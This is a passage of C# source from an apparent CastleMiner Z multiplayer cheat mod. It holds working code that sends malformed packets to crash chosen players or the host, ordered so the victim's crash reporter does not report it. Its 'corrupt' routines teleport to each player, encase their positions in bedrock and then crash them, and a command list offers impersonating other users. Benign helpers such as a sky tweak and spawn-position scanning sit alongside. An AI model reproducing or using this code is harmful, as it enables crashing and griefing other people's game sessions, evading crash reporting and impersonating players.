            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                // Exclude ourselves.
                    if (((Player)networkGamer.Tag).Gamer.IsHost)                                             // Ensure the gamer is not the host.
                    {
                        SendCrashPackets(((Player)networkGamer.Tag).Gamer);
                        break;
                    }
        }

        private static void SendCrashPackets(NetworkGamer gamer)
        {
            LocalNetworkGamer localNetworkGamer = CastleMinerZGame.Instance.MyNetworkGamer;

            // Send invalid / malformed network packets to a desired target.
            try { SendPrivateRemoteData_Crash(gamer);                                  } catch { } // Unicast network packet (null data).
                                                                                                   // Send first to evade their crash reporter from reporting this.
                                                                                                   // This crash happens at the API level and causes a hard-no_report.
            try { SendPrivateDetonateExplosiveMessage_Crash(localNetworkGamer, gamer); } catch { } // Invalid explosive (count).
            try { SendPrivateDetonateRocketMessage_Crash(localNetworkGamer, gamer);    } catch { } // Invalid rocket (count).
        }

        #region Private Network Senders

        private static void SendPrivateRemoteData_Crash(NetworkGamer to)
        {
            /// <summary>
            /// Sends a unicast network packet with a NULL payload to a single peer.
            /// - Target: The specific 'gamer' (not a broadcast).
            /// - Options: 0 == SendDataOptions.None -> unreliable + unordered delivery.
            /// - Effect: In CastleMinerZ's current ReceiveData implementation, a 'null' Data can
            ///   cause a crash (NRE) or "Data buffer is too small" exceptions unless you harden it.
            /// </summary>

            CastleMinerZGame.Instance.CurrentNetworkSession.SendRemoteData(null, 0, to);
        }

        private static void SendPrivateDetonateExplosiveMessage_Crash(LocalNetworkGamer from, NetworkGamer to)
        {
            // Define the send instance message type.
            var sendInstance               = MessageBridge.Get<DetonateExplosiveMessage>();

            // Custom payload data.
            Vector3 position               = ((Player)from?.Tag)?.LocalPosition ?? Vector3.Zero;
            ExplosiveTypes explosiveType   = ExplosiveTypes.Count;

            // Packet fields.
            sendInstance.Location          = (IntVector3)position;
            sendInstance.OriginalExplosion = true;
            sendInstance.ExplosiveType     = explosiveType;

            // Send only to the targeted player.
            MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
        }

        private static void SendPrivateDetonateRocketMessage_Crash(LocalNetworkGamer from, NetworkGamer to)
        {
            // Define the send instance message type.
            var sendInstance = MessageBridge.Get<DetonateRocketMessage>();

            // Custom payload data.
            Vector3 position             = ((Player)from?.Tag)?.LocalPosition ?? Vector3.Zero;
            ExplosiveTypes explosiveType = ExplosiveTypes.Count;

            // Packet fields.
            sendInstance.Location        = (IntVector3)position;
            sendInstance.HitDragon       = false;
            sendInstance.ExplosiveType   = explosiveType;
            sendInstance.ItemType        = InventoryItemIDs.RocketLauncher;

            // Send only to the targeted player.
            MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
        }
        #endregion

        #endregion

        #region Private Place Blocks

        /// <summary>
        /// Places a single block edit either:
        /// - To a specific target gamer via the direct-send bridge (when <paramref name="to"/> is non-null), OR
        /// - Through the normal broadcast/standard pipeline via AlterBlockMessage.Send(...) (when <paramref name="to"/> is null).
        ///
        /// This lets your higher-level builders (tubes/brushes/etc.) reuse one entry point while supporting:
        /// - "Send to everyone" (to = null)
        /// - "Send to one player" (to = specific NetworkGamer)
        /// </summary>
        public static void PlaceBlocksPrivate(
            LocalNetworkGamer from,
            IntVector3        location,
            BlockTypeEnum     blockID,
            NetworkGamer      to = null)
        {
            // If no target is specified, use the normal broadcast/standard send path.
            if (to == null)
            {
                AlterBlockMessage.Send(from, location, blockID);
                return;
            }

            // Otherwise, direct-send to a specific gamer.
            var sendInstance           = MessageBridge.Get<AlterBlockMessage>();
            sendInstance.BlockLocation = location;
            sendInstance.BlockType     = blockID;

            MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, to });
        }

        public static void PlaceBlocksAllExcept(
            LocalNetworkGamer from,
            IntVector3        location,
            BlockTypeEnum     blockID,
            NetworkGamer      excludePlayer)
        {
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (networkGamer != excludePlayer)                                                           // Exclude specified gamer.
                {
                    var sendInstance = MessageBridge.Get<AlterBlockMessage>();
                    sendInstance.BlockLocation = location;
                    sendInstance.BlockType = blockID;

                    MessageBridge.DoSendDirect.Invoke(sendInstance, new object[] { from, networkGamer });
                }
        }
        #endregion

        #region Corrupt World Functions

        #region Corrupt Selected Player

        public static async void CorruptSelectedPlayer(NetworkGamer gamer, bool crash = false)
        {
            _corruptWorldActive = true; // Enable godmode + vanish in-place.
            var oldLocation = CastleMinerZGame.Instance?.LocalPlayer.LocalPosition ?? Vector3.Zero;

            try { await Task.Delay(10);                                                                                                                     } catch { } // Small delay.
            try { CastleMinerZGame.Instance.GameScreen.TeleportToLocation(Vector3.Zero, true);                                                              } catch { } // Teleport to spawn.

            try { await Task.Delay(500);                                                                                                                    } catch { } // Small delay.
            try { PlaceHollow3x3Tube    (CastleMinerZGame.Instance.MyNetworkGamer, new IntVector3(8, -64, -8), new IntVector3(8, 64, -8), to: gamer);       } catch { } // Corrut respawn.
            try { PlaceHollow3x3Tube    (CastleMinerZGame.Instance.MyNetworkGamer, new IntVector3(3, -64, -3), new IntVector3(3, 64, -3), to: gamer);       } catch { } // Corrut spawn.

            try { await Task.Delay(10);                                                                                                                     } catch { } // Small delay.
            try { TpToSelectedPlayer    (gamer);                                                                                                            } catch { } // Teleport to player.
            try { await Task.Delay(500);                                                                                                                    } catch { } // Small delay.
            try { PlaceFootprintAirTubes(CastleMinerZGame.Instance.MyNetworkGamer, player: (Player)gamer.Tag, yMinWorld: -64, yMaxWorld: 64, to: gamer);    } catch { } // Corrupt existing position.

            try { await Task.Delay(10);                                                                                                                     } catch { } // Small delay.
            try { if (crash) CrashSelectedPlayer(gamer);                                                                                                    } catch { } // Send crash packets.
            try
            {
                // Teleport to old position, fallback to spawn.
                if (CastleMinerZGame.Instance.CurrentNetworkSession != null)
                    if (oldLocation != Vector3.Zero)
                        CastleMinerZGame.Instance.LocalPlayer.LocalPosition = oldLocation;
                    else
                        CastleMinerZGame.Instance.GameScreen.TeleportToLocation(Vector3.Zero, true);
            } catch { }

            _corruptWorldActive = false; // Disable godmode + vanish in-place.
            SendLog($"Corrupted Selected Player: '{gamer.Gamertag}'");
        }
        #endregion

        #region Corrupt All Players

        public static async void CorruptAllPlayers()
        {
            // Define counts.
            int crashedPeersCount = 0, crashedHostCount = 0;

            // Enable godmode + vanish in-place.
            _corruptWorldActive = true;
            var oldLocation = CastleMinerZGame.Instance?.LocalPlayer.LocalPosition ?? Vector3.Zero;

            // 1) Corrupt spawn first.
            try { await Task.Delay(10);  } catch { } // Small delay.
            try { CastleMinerZGame.Instance.GameScreen.TeleportToLocation(Vector3.Zero, true); } catch { } // Teleport to spawn.

            try { await Task.Delay(500); } catch { } // Small delay.
            try { PlaceHollow3x3Tube(CastleMinerZGame.Instance.MyNetworkGamer, new IntVector3(8, -64, -8), new IntVector3(8, 64, -8)); } catch { } // Corrut respawn.
            try { PlaceHollow3x3Tube(CastleMinerZGame.Instance.MyNetworkGamer, new IntVector3(3, -64, -3), new IntVector3(3, 64, -3)); } catch { } // Corrut spawn.

            // 2) Corrupt all non-host players.
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                // Exclude ourselves.
                    if (!((Player)networkGamer.Tag).Gamer.IsHost)                                            // Ensure the gamer is not the host.
                    {
                        IntVector3 playerPos = (IntVector3)(((Player)networkGamer?.Tag)?.LocalPosition ?? IntVector3.Zero);                                                  // Broadcast to all so host saves
                                                                                                                                                                             // the locations of its peers.
                        try { await Task.Delay(10);                                                                                                              } catch { } // Small delay.
                        try { TpToSelectedPlayer(networkGamer);                                                                                                  } catch { } // Teleport to player
                        try { await Task.Delay(500);                                                                                                             } catch { } // Small delay.
                        try { PlaceFootprintAirTubes(CastleMinerZGame.Instance.MyNetworkGamer, player: (Player)networkGamer.Tag, yMinWorld: -64, yMaxWorld: 64); } catch { } // Corrupt existing position.
                        try { await Task.Delay(10);                                                                                                              } catch { } // Small delay.
                        try { CrashSelectedPlayer(networkGamer);                                                                                                 } catch { } // Send crash packets.
                        crashedPeersCount++;
                    }

            // 3) Corrupt host last.
            foreach (NetworkGamer networkGamer in CastleMinerZGame.Instance.CurrentNetworkSession.AllGamers) // Iterate through all network gamers.
                if (networkGamer != CastleMinerZGame.Instance.MyNetworkGamer)                                // Exclude ourselves.
                    if (((Player)networkGamer.Tag).Gamer.IsHost)                                             // Ensure the gamer is the host.
                    {
                        IntVector3 playerPos = (IntVector3)(((Player)networkGamer?.Tag)?.LocalPosition ?? IntVector3.Zero);                                                  // Broadcast to all.
                        try { await Task.Delay(10);                                                                                                              } catch { } // Small delay.
                        try { TpToSelectedPlayer(networkGamer);                                                                                                  } catch { } // Teleport to player
                        try { await Task.Delay(500);                                                                                                             } catch { } // Small delay.
                        try { PlaceFootprintAirTubes(CastleMinerZGame.Instance.MyNetworkGamer, player: (Player)networkGamer.Tag, yMinWorld: -64, yMaxWorld: 64); } catch { } // Corrupt existing position.
                        try { await Task.Delay(10);                                                                                                              } catch { } // Small delay.
                        try { CrashSelectedPlayer(networkGamer);                                                                                                 } catch { } // Send crash packets.
                        crashedHostCount++;
                        break;
                    }

            // Teleport to spawn.
            try { await Task.Delay(10);                                                                                                                          } catch { } // Small delay
            try
            {
                // Teleport to old position, fallback to spawn.
                if (CastleMinerZGame.Instance.CurrentNetworkSession != null)
                    if (oldLocation != Vector3.Zero)
                        CastleMinerZGame.Instance.LocalPlayer.LocalPosition = oldLocation;
                    else
                        CastleMinerZGame.Instance.GameScreen.TeleportToLocation(Vector3.Zero, true);
            }
            catch { }

            // Disable godmode + vanish in-place.
            _corruptWorldActive = false;

            if (crashedPeersCount > 0)
                SendLog($"Corrupted '{crashedPeersCount}' Peers & '1' Host");
            else if (crashedHostCount > 0)
                SendLog($"Corrupted '1' Host (no peers found)");
            else
                SendLog($"No players where found to corrupt");
        }
        #endregion

        #region 3x3 Hole Function

        /// <summary>
        /// Places one "slice" of a hollow 3x3 tube at a given center position (same Y),
        /// oriented in the X/Z plane:
        ///
        ///   XXX
        ///   X X   (center is forced to air)
        ///   XXX
        ///
        /// - All 8 perimeter blocks are set to <paramref name="wallBlock"/>.
        /// - The center (dx=0,dz=0) is set to <paramref name="airBlock"/> to guarantee the tube is hollow.
        /// - If <paramref name="to"/> is null, edits are sent through the normal broadcast path.
        /// - If <paramref name="to"/> is non-null, edits are direct-sent to that specific gamer.
        /// </summary>
        private static void PlaceHollow3x3Slice(
            LocalNetworkGamer from,
            IntVector3        center,
            BlockTypeEnum     wallBlock,
            BlockTypeEnum     airBlock,
            NetworkGamer      to = null)
        {
            for (int dx = -1; dx <= 1; dx++)
                for (int dz = -1; dz <= 1; dz++)
                {
                    var p = new IntVector3(center.X + dx, center.Y, center.Z + dz);

                    if (dx == 0 && dz == 0)
                        PlaceBlocksPrivate(from, p, airBlock, to);   // force hollow
                    else
                        PlaceBlocksPrivate(from, p, wallBlock, to);  // ring
                }
        }

        /// <summary>
        /// Builds a hollow 3x3 tube by "extruding" the hollow 3x3 slice from <paramref name="start"/> to <paramref name="end"/>.
        ///
        /// Notes:
        /// - Best suited for axis-aligned segments (pure X, pure Y, or pure Z).
        /// - If start/end differ in multiple axes (diagonal), this steps along the dominant axis only.
        ///   (If you want true 3D Bresenham stepping for diagonals, you can swap the stepping logic.)
        ///
        /// Messaging:
        /// - If <paramref name="to"/> is null, each block edit uses AlterBlockMessage.Send(...) (broadcast/standard path).
        /// - If <paramref name="to"/> is non-null, each block edit is direct-sent to that gamer via MessageBridge.DoSendDirect.
        /// </summary>
        public static void PlaceHollow3x3Tube(
            LocalNetworkGamer from,
            IntVector3        start,
            IntVector3        end,
            NetworkGamer      to        = null,
            BlockTypeEnum     wallBlock = BlockTypeEnum.Bedrock,
            BlockTypeEnum     airBlock  = BlockTypeEnum.Empty)
        {
            int dx = end.X - start.X;
            int dy = end.Y - start.Y;
            int dz = end.Z - start.Z;

            int ax = Math.Abs(dx);
            int ay = Math.Abs(dy);
            int az = Math.Abs(dz);

            // If start == end, still place a single hollow slice.
            int steps = Math.Max(ax, Math.Max(ay, az));
            if (steps == 0)
            {
                PlaceHollow3x3Slice(from, start, wallBlock, airBlock, to);
                return;
            }

            int sx = dx == 0 ? 0 : Math.Sign(dx);
            int sy = dy == 0 ? 0 : Math.Sign(dy);
            int sz = dz == 0 ? 0 : Math.Sign(dz);

            var cur = start;

            // Include both endpoints.
            for (int i = 0; i <= steps; i++)
            {
                PlaceHollow3x3Slice(from, cur, wallBlock, airBlock, to);

                // Advance one block along the dominant axis.
                if (ax >= ay && ax >= az) cur = new IntVector3(cur.X + sx, cur.Y, cur.Z);
                else if (ay >= ax && ay >= az) cur = new IntVector3(cur.X, cur.Y + sy, cur.Z);
                else cur = new IntVector3(cur.X, cur.Y, cur.Z + sz);
            }
        }
        #endregion

        #region Player-Smart Hole Function

        /// <summary>
        /// Builds one or more vertical 1x1 air shafts (each wrapped by a 3x3 bedrock shell)
        /// at every X/Z block column the player's FEET hitbox overlaps (1..4 columns).
        ///
        /// Example:
        /// - If the player is centered over a block: 1 column.
        /// - If the player is straddling an edge: 2 columns.
        /// - If the player is on a corner: 4 columns.
        ///
        /// Important:
        /// - We place ALL wall blocks first, then carve ALL air centers last.
        ///   This prevents adjacent tunnels from overwriting each other's center with bedrock.
        /// </summary>
        public static void PlaceFootprintAirTubes(
            LocalNetworkGamer from,
            Player player,
            int yMinWorld = -64,
            int yMaxWorld = 64,
            NetworkGamer to = null,
            BlockTypeEnum wallBlock = BlockTypeEnum.Bedrock,
            BlockTypeEnum airBlock = BlockTypeEnum.Empty)
        {
            if (from == null || player == null)
                return;

            var terrain = BlockTerrain.Instance;
            if (terrain == null)
                return;

            int y0 = yMinWorld;
            int y1 = yMaxWorld;
            if (y1 < y0)
                return;

            // Footprint (XZ) based on the player's AABB at the feet.
            // This is what makes "standing between 145 and 146" produce BOTH columns.
            Vector3 pos = player.WorldPosition;
            Vector3 min = pos + player.PlayerAABB.Min;
            Vector3 max = pos + player.PlayerAABB.Max;

            int x0 = (int)Math.Floor(min.X);
            int x1 = (int)Math.Floor(max.X);
            int z0 = (int)Math.Floor(min.Z);
            int z1 = (int)Math.Floor(max.Z);

            // Collect unique X/Z centers we intend to dig through (1..4).
            // We store Y=0 here just as a placeholder; real Y is applied later.
            var centers = new List<IntVector3>(4);
            for (int x = x0; x <= x1; x++)
            {
                for (int z = z0; z <= z1; z++)
                {
                    // Quick bounds sanity: ensure some representative point is inside the world array.
                    // (Prevents sending a bunch of invalid edits if something weird happens.)
                    if (terrain.MakeIndexFromWorldIndexVector(new IntVector3(x, y0, z)) != -1)
                        centers.Add(new IntVector3(x, 0, z));
                }
            }

            if (centers.Count == 0)
                return;

            // To reduce duplicate edits when columns are adjacent (rings overlap),
            // we de-dupe edits with hash sets. (Safer than relying on IntVector3 hashing.)
            var wallEdits = new HashSet<IntVector3>(new IntVector3Comparer());
            var airEdits = new HashSet<IntVector3>(new IntVector3Comparer());

            // Build the edit sets.
            foreach (var c in centers)
            {
                for (int y = y0; y <= y1; y++)
                {
                    // Center air column (carved after walls).
                    airEdits.Add(new IntVector3(c.X, y, c.Z));

                    // 3x3 ring around the center.
                    for (int dx = -1; dx <= 1; dx++)
                        for (int dz = -1; dz <= 1; dz++)
                        {
                            if (dx == 0 && dz == 0)
                                continue;

                            wallEdits.Add(new IntVector3(c.X + dx, y, c.Z + dz));
                        }
                }
            }

            // PASS 1: place walls.
            foreach (var p in wallEdits)
                PlaceBlocksPrivate(from, p, wallBlock, to);

            // PASS 2: carve air centers (wins against any overlaps).
            foreach (var p in airEdits)
                PlaceBlocksPrivate(from, p, airBlock, to);
        }

        /// <summary>
        /// Hash/equality for IntVector3 so HashSet de-duping is always correct,
        /// even if IntVector3 doesn't implement GetHashCode/Equals the way we need.
        /// </summary>
        private sealed class IntVector3Comparer : IEqualityComparer<IntVector3>
        {
            public bool Equals(IntVector3 a, IntVector3 b) =>
                a.X == b.X && a.Y == b.Y && a.Z == b.Z;

            public int GetHashCode(IntVector3 v)
            {
                unchecked
                {
                    int h = 17;
                    h = (h * 31) + v.X;
                    h = (h * 31) + v.Y;
                    h = (h * 31) + v.Z;
                    return h;
                }
            }
        }
        #endregion

        #endregion

        #region Player Box Function

        /// <summary>
        /// Builds a hollow rectangular box between two world corners.
        /// - Boundary blocks become <paramref name="wallBlock"/>
        /// - Interior becomes <paramref name="airBlock"/>
        /// - If <paramref name="to"/> is null, uses normal broadcast sends.
        /// - If <paramref name="to"/> is non-null, direct-sends only to that gamer.
        /// </summary>
        public static void PlaceHollowBox(
            LocalNetworkGamer from,
            IntVector3        a,
            IntVector3        b,
            NetworkGamer      to        = null,
            BlockTypeEnum     wallBlock = BlockTypeEnum.Bedrock,
            BlockTypeEnum     airBlock  = BlockTypeEnum.Empty)
        {
            if (from == null)
                return;

            var terrain = BlockTerrain.Instance;
            if (terrain == null)
                return;

            int x0 = Math.Min(a.X, b.X);
            int x1 = Math.Max(a.X, b.X);
            int y0 = Math.Min(a.Y, b.Y);
            int y1 = Math.Max(a.Y, b.Y);
            int z0 = Math.Min(a.Z, b.Z);
            int z1 = Math.Max(a.Z, b.Z);

            var wallEdits = new HashSet<IntVector3>(new IntVector3Comparer());
            var airEdits = new HashSet<IntVector3>(new IntVector3Comparer());

            for (int y = y0; y <= y1; y++)
                for (int x = x0; x <= x1; x++)
                    for (int z = z0; z <= z1; z++)
                    {
                        var p = new IntVector3(x, y, z);

                        // Respect world bounds.
                        if (terrain.MakeIndexFromWorldIndexVector(p) == -1)
                            continue;

                        bool isBoundary =
                            x == x0 || x == x1 ||
                            y == y0 || y == y1 ||
                            z == z0 || z == z1;

                        if (isBoundary)
                            wallEdits.Add(p);
                        else
                            airEdits.Add(p);
                    }

            // PASS 1: Place shell.
            foreach (var p in wallEdits)
                PlaceBlocksPrivate(from, p, wallBlock, to);

            // PASS 2: Carve interior.
            foreach (var p in airEdits)
                PlaceBlocksPrivate(from, p, airBlock, to);
        }

        /// <summary>
        /// Builds a hollow box around the player's current body using the player's AABB.
        /// Default padding gives them some breathing room instead of placing the wall
        /// directly on the hitbox.
        /// </summary>
        public static void PlacePlayerBox(
            LocalNetworkGamer from,
            Player            player,
            int               sidePadding    = 1,
            int               floorPadding   = 1,
            int               ceilingPadding = 1,
            NetworkGamer      to             = null,
            BlockTypeEnum     wallBlock      = BlockTypeEnum.Bedrock,
            BlockTypeEnum     airBlock       = BlockTypeEnum.Empty)
        {
            if (from == null || player == null)
                return;

            Vector3 pos = player.WorldPosition;
            Vector3 min = pos + player.PlayerAABB.Min;
            Vector3 max = pos + player.PlayerAABB.Max;

            int x0 = (int)Math.Floor(min.X) - sidePadding;
            int x1 = (int)Math.Floor(max.X) + sidePadding;

            int y0 = (int)Math.Floor(min.Y) - floorPadding;
            int y1 = (int)Math.Floor(max.Y) + ceilingPadding;

            int z0 = (int)Math.Floor(min.Z) - sidePadding;
            int z1 = (int)Math.Floor(max.Z) + sidePadding;

            PlaceHollowBox(
                from,
                new IntVector3(x0, y0, z0),
                new IntVector3(x1, y1, z1),
                to,
                wallBlock,
                airBlock);
        }
        #endregion

        #region Player-Smart Hole-To-Bedrock Function

        /// <summary>
        /// Carves one or more vertical 1x1 air shafts from the player's current feet footprint
        /// down to the given bedrock/world-min Y level.
        ///
        /// Example:
        /// - If the player is centered over a block: 1 column.
        /// - If the player is straddling an edge: 2 columns.
        /// - If the player is on a corner: 4 columns.
        ///
        /// Notes:
        /// - Reuses the same "smart footprint" idea as PlaceFootprintAirTubes(...),
        ///   but places ONLY air (no surrounding shell).
        /// - If <paramref name="to"/> is null, edits are broadcast normally.
        /// - If <paramref name="to"/> is non-null, edits are direct-sent only to that gamer.
        /// </summary>
        public static void PlaceFootprintAirHoleToBedrock(
            LocalNetworkGamer from,
            Player            player,
            int               yMinWorld = -64,
            NetworkGamer      to        = null,
            BlockTypeEnum     airBlock  = BlockTypeEnum.Empty)
        {
            if (from == null || player == null)
                return;

            var terrain = BlockTerrain.Instance;
            if (terrain == null)
                return;

            // Use the player's actual world AABB to determine which X/Z columns
            // their feet currently overlap.
            Vector3 pos = player.WorldPosition;
            Vector3 min = pos + player.PlayerAABB.Min;
            Vector3 max = pos + player.PlayerAABB.Max;

            int x0 = (int)Math.Floor(min.X);
            int x1 = (int)Math.Floor(max.X);
            int z0 = (int)Math.Floor(min.Z);
            int z1 = (int)Math.Floor(max.Z);

            // Start digging at the player's feet.
            int yStart = (int)Math.Floor(min.Y);
            if (yStart < yMinWorld)
                return;

            var airEdits = new HashSet<IntVector3>(new IntVector3Comparer());

            for (int x = x0; x <= x1; x++)
            {
                for (int z = z0; z <= z1; z++)
                {
                    for (int y = yMinWorld; y <= yStart; y++)
                    {
                        var p = new IntVector3(x, y, z);

                        // Respect world bounds.
                        if (terrain.MakeIndexFromWorldIndexVector(p) == -1)
                            continue;

                        airEdits.Add(p);
                    }
                }
            }

            // Carve the air shaft(s).
            foreach (var p in airEdits)
                PlaceBlocksPrivate(from, p, airBlock, to);
        }
        #endregion

        #region Spawn Helpers - Valid Ring Spawn (Ground Scan + 2-Block Headroom)

        // Tuning knobs.
        private const int RING_MIN = 0;
        private const int RING_MAX = 20;

        private const int SCAN_START_ABOVE_PLAYER = 10; // start scan at playerY + 10
        private const int WORLD_MIN_Y             = -64;

        // Cache ring offsets per radius (r -> offsets on the perimeter).
        private static readonly Dictionary<int, (int dx, int dz)[]> _ringCache =
            new Dictionary<int, (int dx, int dz)[]>();

        // Cheap RNG for shuffle order (fine for this use).
        private static readonly Random _rng = new Random();

        /// <summary>
        /// Attempts to find a valid spawn position on the square ring of radius 'r' around the player.
        /// Valid means:
        ///   - find a non-air "ground" block by scanning downward from playerY + 10
        ///   - require 2 air blocks above that ground
        /// Tries each ring location at most once (random order).
        /// </summary>
        private static bool TryPickValidSpawnPosOnRing(Player p, int r, out Vector3 spawnPos)
        {
            spawnPos = default;

            if (p == null) return false;

            r = Clamp(r, RING_MIN, RING_MAX);

            // Convert player position to block coords.
            int baseX = (int)Math.Floor(p?.LocalPosition.X ?? 0f);
            int baseY = (int)Math.Floor(p?.LocalPosition.Y ?? 0f);
            int baseZ = (int)Math.Floor(p?.LocalPosition.Z ?? 0f);

            int startY = baseY + SCAN_START_ABOVE_PLAYER;

            // Radius 0 = just test the player's current column.
            var ring = (r == 0) ? new[] { (dx: 0, dz: 0) } : GetOrBuildSquareRing(r);

            // Try all ring points once, randomized order.
            int[] order = BuildShuffledOrder(ring.Length);

            for (int i = 0; i < order.Length; i++)
            {
                var (dx, dz) = ring[order[i]];
                int x = baseX + dx;
                int z = baseZ + dz;

                if (!TryFindGroundWithHeadroom(x, startY, z, out int spawnY))
                    continue;

                // Center in block so mobs don't hug edges.
                spawnPos = new Vector3(x + 0.5f, spawnY, z + 0.5f);
                return true;
            }

            return false;
        }

        /// <summary>
        /// Scan downward at (x,z) starting from startY.
        /// When you hit a non-air block at y, require air at y+1 and y+2.
        /// If valid, return spawnY = y+1.
        /// </summary>
        private static bool TryFindGroundWithHeadroom(int x, int startY, int z, out int spawnY)
        {
            spawnY = 0;

            if (InGameHUD.Instance == null) return false;

            // Clamp-ish: We don't know exact world min/max here; keep it safe.
            int y = startY;
            if (y < WORLD_MIN_Y) y = WORLD_MIN_Y;

            // Walk downward until we hit something non-air.
            // NOTE: if the first hit is a roof/tree/etc and headroom fails, we keep scanning down.
            for (; y >= WORLD_MIN_Y; y--)
            {
                BlockTypeEnum bt = InGameHUD.GetBlock(new IntVector3(x, y, z));

                if (bt == BlockTypeEnum.Empty)
                    continue;

                // Found ground at y. Need headroom above.
                BlockTypeEnum a1 = InGameHUD.GetBlock(new IntVector3(x, y + 1, z));
                BlockTypeEnum a2 = InGameHUD.GetBlock(new IntVector3(x, y + 2, z));

                if (a1 == BlockTypeEnum.Empty && a2 == BlockTypeEnum.Empty)
                {
                    spawnY = y + 1;
                    return true;
                }

                // Not enough headroom here; keep scanning lower.
            }

            return false;
        }

        /// <summary>
        /// Square ring offsets: All (dx,dz) where max(|dx|,|dz|) == r.
        /// Count is exactly 8*r (for r > 0).
        /// </summary>
        private static (int dx, int dz)[] GetOrBuildSquareRing(int r)
        {
            if (_ringCache.TryGetValue(r, out var ring))
                return ring;

            var list = new List<(int dx, int dz)>(8 * r);

            for (int dx = -r; dx <= r; dx++)
                for (int dz = -r; dz <= r; dz++)
                    if (Math.Max(Math.Abs(dx), Math.Abs(dz)) == r)
                        list.Add((dx, dz));

            ring = list.ToArray();
            _ringCache[r] = ring;
            return ring;
        }

        private static int[] BuildShuffledOrder(int n)
        {
            var order = new int[n];
            for (int i = 0; i < n; i++) order[i] = i;

            // Fisher-Yates shuffle.
            for (int i = n - 1; i > 0; i--)
            {
                int j = _rng.Next(i + 1);
                (order[j], order[i]) = (order[i], order[j]);
            }

            return order;
        }

        private static int Clamp(int v, int lo, int hi) => v < lo ? lo : (v > hi ? hi : v);

        #endregion

        #region Always Day Sky Functions

        /// <summary>
        /// In honor of 'DaytimeGetsAawayFromMe'.
        /// </summary>
        public static class SkyTweaks
        {
            private static TextureCube _originalNightTexture;
            private static bool        _capturedOriginalNightTexture;
            private static bool        _isDaySkyAtNightEnabled;

            /// <summary>
            /// Enables or disables the "day sky at night" visual effect.
            ///
            /// true  = night sky uses the already-loaded day sky texture
            /// false = restores the original night sky texture
            /// </summary>
            public static void SetDaySkyAtNight(bool enabled)
            {
                Type skyType = typeof(CastleMinerSky);
                const BindingFlags flags = BindingFlags.Static | BindingFlags.NonPublic;

                FieldInfo nightField = skyType.GetField("_nightTexture", flags);
                FieldInfo dayField   = skyType.GetField("_dayTexture", flags);

                if (nightField == null || dayField == null)
                    return;


                if (!_capturedOriginalNightTexture && nightField.GetValue(null) is TextureCube currentNight)
                {
                    _originalNightTexture         = currentNight;
                    _capturedOriginalNightTexture = true;
                }

                if (enabled)
                {
                    if (!(dayField.GetValue(null) is TextureCube dayTex))
                        return;

                    nightField.SetValue(null, dayTex);
                    _isDaySkyAtNightEnabled = true;
                    return;
                }

                if (_capturedOriginalNightTexture && _originalNightTexture != null)
                {
                    nightField.SetValue(null, _originalNightTexture);
                    _isDaySkyAtNightEnabled = false;
                }
            }

            /// <summary>
            /// Toggles the effect on/off.
            /// </summary>
            public static void ToggleDaySkyAtNight()
            {
                SetDaySkyAtNight(!_isDaySkyAtNightEnabled);
            }
        }
        #endregion

        #region Unused Functions

        /// <summary>
        /// Refills the local player's health and stamina, and forces immediate health recovery.
        /// </summary>
        public static void RefillHPSP(float value = 1f /* 1 = 100. */)
        {
            CastleMinerZGame.Instance.GameScreen.HUD.PlayerHealth       = value;
            CastleMinerZGame.Instance.GameScreen.HUD.PlayerStamina      = value;
            CastleMinerZGame.Instance.GameScreen.HUD.HealthRecoverRate  = float.MaxValue;
            CastleMinerZGame.Instance.GameScreen.HUD.HealthRecoverTimer = new OneShotTimer(TimeSpan.FromMilliseconds(0.0));
        }
        #endregion

        #endregion

        #region Helpers

        #region Has Screen In Stack

        /// <summary>
        /// Returns true if a ScreenGroup's internal stack currently contains a screen whose runtime type name
        /// matches <paramref name="screenTypeName"/>. Checks the top screen first (fast), then scans the group's
        /// private stack, and optionally recurses into nested ScreenGroups.
        ///
        /// Notes:
        /// - This uses reflection to read the private field "_screens" inside ScreenGroup.
        /// - We check CurrentScreen first (cheap), then fall back to scanning the stack.
        /// - Optional recursion allows finding screens inside nested ScreenGroups.
        /// - For Crafting specifically, prefer GameScreen.IsBlockPickerUp when available (fast, no reflection).
        ///
        /// Example:
        /// var gs = CastleMinerZGame.Instance?.GameScreen;
        /// if (HasScreenInStack(gs, "CraftingScreen")) return;
        /// </summary>
        private static bool HasScreenInStack(ScreenGroup group, string screenTypeName)
        {
            if (group == null || string.IsNullOrEmpty(screenTypeName)) return false;

            // Cheap: Top of this group.
            var cur = group.CurrentScreen;
            if (cur != null && cur.GetType().Name == screenTypeName) return true;

            // Scan the private stack for a match (and optionally recurse into nested ScreenGroups).
            const BindingFlags F = BindingFlags.Instance | BindingFlags.NonPublic;
            if (!(group.GetType().GetField("_screens", F)?.GetValue(group) is System.Collections.IEnumerable stack)) return false;

            foreach (var s in stack)
            {
                if (s == null) continue;

                if (s.GetType().Name == screenTypeName) return true;

                // Optional: Nested ScreenGroup (covers cases where groups are stacked inside groups).
                if (s is ScreenGroup child && HasScreenInStack(child, screenTypeName))
                    return true;
            }

            return false;
        }
        #endregion

        #region Tick Delay Gate Helper

        /// <summary>
        /// Returns true when the action is allowed to run.
        /// - delayMs <= 0 means "no delay" (run every tick).
        /// - Uses TotalGameTime so it does NOT slow the rest of Tick.
        /// </summary>
        private static bool DelayGate(ref double nextAllowedMs, double nowMs, int delayMs)
        {
            if (delayMs <= 0)
                return true;

            if (nowMs < nextAllowedMs)
                return false;

            nextAllowedMs = nowMs + delayMs; // Schedule next allowed run.
            return true;
        }
        #endregion

        #endregion

        #endregion

        /// <summary>
        /// This is the main command logic for the mod.
        /// </summary>
        #region Chat Command Functions

        #region Help Command List

        private static readonly (string command, string description)[] commands = new (string, string)[]
        {
            // Messaging Commands.
            ("privatechat [to gamer] [message(/check)]", "Sends a private broadcast packet to a user."),
            ("sudo [gamer|id:##] [message(/check)]",     "Impersonate another user."),
        };
        #endregion

        #region Command Functions

        #region /privatechat

        [Command("/privatechat")]
        [Command("/private")]
        [Command("/p")]
        private static void ExecutePrivateChat(string[] args)
        {
